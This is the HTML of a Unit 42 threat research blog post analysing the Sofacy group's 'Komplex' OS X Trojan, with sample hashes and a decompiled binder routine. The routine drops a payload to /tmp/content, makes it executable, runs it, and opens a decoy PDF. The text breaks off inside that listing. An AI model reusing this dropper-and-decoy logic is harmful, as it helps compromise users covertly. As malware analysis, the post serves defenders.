        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    else if(referer == 'CloudCortex'){
        article.dataset.type = 'cloudcortex';
    }
    else if(referer == 'Sase'){
        article.dataset.type = 'sase';
    }
    else if(referer == 'Unit'){
        article.dataset.type = 'unit';
    }
    else if(referer == 'Ngfw'){
        article.dataset.type = 'ngfw';
    }
    //set class to default
    if(referer == 'Unit' || referer == 'Ngfw'){
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    callMainSitePrismaNavHTML();
}
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->



<main class="main">
    <section class="section section--article">
        <div class="pa article-banner" style="background-image:url('https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300.jpg')">
          <div class="l-container"> 
            <div class="l-breadcrumbs"> 
              <ul> <li> <a href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:breadcrumb:Threat Research">Threat Research Center</a></li><li><a href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" title="Threat Research" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:breadcrumb:Threat Research">Threat Research</a></li><li class="is-current"><a href="https://unit42.paloaltonetworks.com/category/malware/" role="link" title="Malware" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:breadcrumb:Malware">Malware</a></li> </ul>
            </div>            <div class="ab__title">
              <a class="card-category" href="https://unit42.paloaltonetworks.com/category/malware/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Malware"><span class="ab-title__pre">Malware</span></a> 
              <h1>Sofacy’s ‘Komplex’ OS X Trojan</h1>
              <div class="ab__video">
              <span class="duration"> 
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg" alt="Clock Icon"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 10</span> <span class="rt-label rt-postfix"></span></span> min read              </span>
                              </div>          
              <div class="ab-lc__wrapper">
                <span class="ab-title__pre">Related Products</span><div class="ab__link-cards"><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/unit-42-incident-response/" style="--card-color: #c94727" role="link" title="Unit 42 Incident Response" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Unit 42 Incident Response"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/unit42_RGB_logo_Icon_Color.png" alt="Unit 42 Incident Response icon">Unit 42 Incident Response</a></div>              </div>
            </div>
          </div>
          <div class="ab__footer">
            <div class="l-container">
              <div class="ab__footer-wrapper">
                <ul class="ab__features" role="list">
                  <li role="listitem">
				 <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg" alt="Profile Icon">
					 <div class="ab__text"><span>By:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Dani Creus" href="https://unit42.paloaltonetworks.com/author/dani-creus/">Dani Creus</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Tyler Halfpop" href="https://unit42.paloaltonetworks.com/author/tyler-halfpop/">Tyler Halfpop</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Robert Falcone" href="https://unit42.paloaltonetworks.com/author/robertfalcone/">Robert Falcone</a></li></ul></div></li>                  <li role="listitem">
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg" alt="Published Icon">
			<div class="ab__text"><span>Published:</span>September 26, 2016</div></li>					<li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg" alt="Tags Icon"><div class="ab__text"><span>Categories:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Malware" href="https://unit42.paloaltonetworks.com/category/malware/">Malware</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Threat Actor Groups" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/">Threat Actor Groups</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Threat Research" href="https://unit42.paloaltonetworks.com/category/threat-research/">Threat Research</a></li></ul></div>
		</li>                  <li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg" alt="Tags Icon"><div class="ab__text"><span>Tags:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:aerospace" href="https://unit42.paloaltonetworks.com/tag/aerospace/">Aerospace</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Fighting Ursa" href="https://unit42.paloaltonetworks.com/tag/fighting-ursa/">Fighting Ursa</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Komplex" href="https://unit42.paloaltonetworks.com/tag/komplex/">Komplex</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:OS X" href="https://unit42.paloaltonetworks.com/tag/os-x/">OS X</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Sofacy" href="https://unit42.paloaltonetworks.com/tag/sofacy/">Sofacy</a></li><li><a data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:Trojan" href="https://unit42.paloaltonetworks.com/tag/trojan/">Trojan</a></li></ul></div>
		</li>                </ul>
                <div class="ab__options">
                  <ul role="list">
                                        <li role="listitem"><a href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/?pdf=download&#038;lg=en&#038;_wpnonce=5ce05ea96c" role="link" target="_blank"  title="Click here to download" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:pdfdownload"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg" alt="Download Icon"></a></li>
                    <li role="listitem"><a href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/?pdf=print&#038;lg=en&#038;_wpnonce=5ce05ea96c" target="_blank" role="link" title="Click here to print" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:hero:pdfprint"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg" alt="Print Icon"></a></li>
                  </ul>
                  
	<div class="ab__share" id="shareDropdown" role="button" aria-expanded="false">
	<a href="#" role="link" title="Click here to share" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share" class="">Share<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"></a><ul class="share-dropdown" role="menu">
				<li role="menuitem">
					<a href="#" class="copy-url" id="copyUrl" data-url="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" role="link" title="Copy link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share:link"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg" alt="Link Icon"></a>
				</li>
				<li role="menuitem">
					<a href="mailto:?subject=Sofacy&rsquo;s%20&lsquo;Komplex&rsquo;%20OS%20X%20Trojan&#038;body=Check%20out%20this%20article%20https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" role="link" title="Share in email" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share:email"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg" alt="Link Email"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" target="_blank" role="link" title="Share in Facebook" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share:facebook"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg" alt="Facebook Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F&#038;title=Sofacy’s%20‘Komplex’%20OS%20X%20Trojan" target="_blank" role="link" title="Share in LinkedIn" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share:linkedin"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg" alt="LinkedIn Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F&#038;text=Sofacy&rsquo;s%20&lsquo;Komplex&rsquo;%20OS%20X%20Trojan" target="_blank" role="link" title="Share in Twitter" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share:twitter"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg" alt="Twitter Icon"></a>
				</li>
				<li role="menuitem">
					<a href="//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" target="_blank" role="link" title="Share in Reddit" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share:reddit"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg" alt="Reddit Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://mastodon.social/share?text=Sofacy’s%20‘Komplex’%20OS%20X%20Trojan%20https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" target="_blank" role="link" title="Share in Mastodon" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:share:mastodon"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg" alt="Mastodon Icon"></a>
				</li>
	  </ul>
    </div>                </div>
              </div>
            </div>
          </div>
        </div>
      </section> 
    <section class="section blog-contents"> 
      <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-sofacys-komplex-os-x-trojan/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>Unit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform.</p>
<p>The Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy - the Carberp variant that Sofacy had used in <a href="https://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/" target="_blank">previous attack campaigns</a> on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.<span id="more-19694"></span></p>
<h3>Komplex Binder</h3>
<p>Komplex is a Trojan that the Sofacy group created to compromise individuals using OS X devices. The Trojan has multiple parts, first leading with a binder component that is responsible for saving a second payload and a decoy document to the system. We found three different versions of the Komplex binder, one that was created to run on x86, another on x64, and a third that contained binders for both x86 and x64 architectures. We found the following samples of the Komplex binder:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f3b510568367" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134: Mach-O 64-
bit executable x86_64
c1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7: Mach-O 
executable i386
cffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4: Mach-O 
universal binary with 2 architectures</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f3b510568367-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f3b510568367-2">2</div><div class="crayon-num" data-line="crayon-67d4f94a16f3b510568367-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f3b510568367-4">4</div><div class="crayon-num" data-line="crayon-67d4f94a16f3b510568367-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f3b510568367-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f3b510568367-1"><span class="crayon-cn">2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mach</span>-<span class="crayon-i">O</span><span class="crayon-h"> </span><span class="crayon-cn">64</span>-</div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f3b510568367-2"><span class="crayon-e">bit </span><span class="crayon-e">executable </span><span class="crayon-e">x86_64</span></div><div class="crayon-line" id="crayon-67d4f94a16f3b510568367-3"><span class="crayon-i">c1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mach</span>-<span class="crayon-i">O</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f3b510568367-4"><span class="crayon-e">executable </span><span class="crayon-e">i386</span></div><div class="crayon-line" id="crayon-67d4f94a16f3b510568367-5"><span class="crayon-i">cffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mach</span>-<span class="crayon-i">O</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f3b510568367-6"><span class="crayon-e">universal </span><span class="crayon-e">binary </span><span class="crayon-i">with</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-i">architectures</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>Regardless of architecture, these initial binders all save a second embedded Mach-O file to ‘/tmp/content’. This file is the Komplex dropper used in the next stage of installation and to maintain persistence. After saving the Komplex dropper, these binders would then save a legitimate decoy document to the system and open them using the ‘Preview’ application to minimize suspicion of any malicious activity. Figure 1 shows the main function found in one of the initial droppers that saves and opens a PDF decoy, as well as executes another executable file saved as ‘/tmp/content’.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f45219750911" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int _main(int arg0, int arg1) {
    var_28 = [[NSAutoreleasePool alloc] init];
    var_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex:0x0];
    var_40 = [NSString stringWithFormat:@"%@/roskosmos_2015-2025.pdf", var_38];
    var_48 = [NSString stringWithFormat:@"SetFile -a E %@/roskosmos_2015-2025.pdf", 
var_38];
    var_50 = [NSString stringWithFormat:@"rm -rf %@/roskosmos_2015-2025.app", var_38];
    var_58 = [NSString stringWithFormat:@"open -a Preview.app %@/roskosmos_2015-
2025.pdf", var_38];
    [[NSData dataWithBytes:_joiner length:0x20f74] writeToFile:@"/tmp/content" 
atomically:0x1];
    system([var_50 UTF8String]);
    system("chmod 755 /tmp/content");
    [[NSData dataWithBytes:_pdf length:0x182c82] writeToFile:var_40 atomically:0x1];
    system([var_48 UTF8String]);
    var_70 = [[NSTask alloc] init];
    [var_70 setLaunchPath:@"/tmp/content"];
    [var_70 launch];
    [var_70 waitUntilExit];
    system([var_58 UTF8String]);
    remove(*arg1);
    [var_28 release];
    return 0x0;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-2">2</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-4">4</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-6">6</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-8">8</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-10">10</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-12">12</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-14">14</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-16">16</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-18">18</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-20">20</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-22">22</div><div class="crayon-num" data-line="crayon-67d4f94a16f45219750911-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f45219750911-24">24</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f45219750911-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">_main</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">arg0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">arg1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_28</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSAutoreleasePool </span><span class="crayon-i">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_38</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSSearchPathForDirectoriesInDomains</span><span class="crayon-sy">(</span><span class="crayon-cn">0xf</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">objectAtIndex</span><span class="crayon-sy">:</span><span class="crayon-cn">0x0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_40</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-i">stringWithFormat</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"%@/roskosmos_2015-2025.pdf"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_48</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-i">stringWithFormat</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"SetFile -a E %@/roskosmos_2015-2025.pdf"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-6"><span class="crayon-i">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_50</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-i">stringWithFormat</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"rm -rf %@/roskosmos_2015-2025.app"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_58</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSString </span><span class="crayon-i">stringWithFormat</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"open -a Preview.app %@/roskosmos_2015-</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-9"><span class="crayon-s">2025.pdf"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">var_38</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-i">dataWithBytes</span><span class="crayon-sy">:</span><span class="crayon-e">_joiner </span><span class="crayon-i">length</span><span class="crayon-sy">:</span><span class="crayon-cn">0x20f74</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">writeToFile</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/tmp/content"</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-11"><span class="crayon-i">atomically</span><span class="crayon-sy">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">var_50 </span><span class="crayon-i">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"chmod 755 /tmp/content"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-i">dataWithBytes</span><span class="crayon-sy">:</span><span class="crayon-e">_pdf </span><span class="crayon-i">length</span><span class="crayon-sy">:</span><span class="crayon-cn">0x182c82</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">writeToFile</span><span class="crayon-sy">:</span><span class="crayon-e">var_40 </span><span class="crayon-i">atomically</span><span class="crayon-sy">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">var_48 </span><span class="crayon-i">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_70</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSTask </span><span class="crayon-i">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_70 </span><span class="crayon-i">setLaunchPath</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/tmp/content"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-18"><span 